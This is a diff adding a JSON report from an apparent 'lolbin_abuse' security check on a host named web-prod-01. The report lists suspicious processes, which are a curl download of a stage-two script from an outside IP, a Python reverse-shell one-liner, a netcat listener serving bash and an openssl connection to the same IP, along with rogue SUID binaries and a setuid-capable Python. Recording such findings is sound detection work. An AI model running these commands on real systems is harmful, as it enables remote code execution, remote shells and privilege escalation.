@@ -1,0 +1,20 @@
+{
+  "collected_at": "2026-02-21T03:15:00Z",
+  "hostname": "web-prod-01",
+  "check": "lolbin_abuse",
+  "suspicious_processes": [
+    {"pid":31200,"user":"www-data","command":"curl -s http://91.215.85.17/stage2.sh -o /tmp/.cache/update.sh"},
+    {"pid":31210,"user":"www-data","command":"python3 -c import socket,subprocess,os;s=socket.socket(...)"},
+    {"pid":31315,"user":"root","command":"nc -lvp 8888 -e /bin/bash"},
+    {"pid":31320,"user":"root","command":"openssl s_client -connect 91.215.85.17:443 -quiet"}
+  ],
+  "suid_binaries": [
+    {"path":"/tmp/.cache/escalate","owner":"root","permissions":"4755"},
+    {"path":"/dev/shm/nmap","owner":"root","permissions":"6755"}
+  ],
+  "capability_binaries": [
+    {"path":"/usr/bin/ping","capabilities":" cap_net_raw=ep"},
+    {"path":"/usr/bin/python3.10","capabilities":" cap_setuid=ep"}
+  ],
+  "errors": []
+}
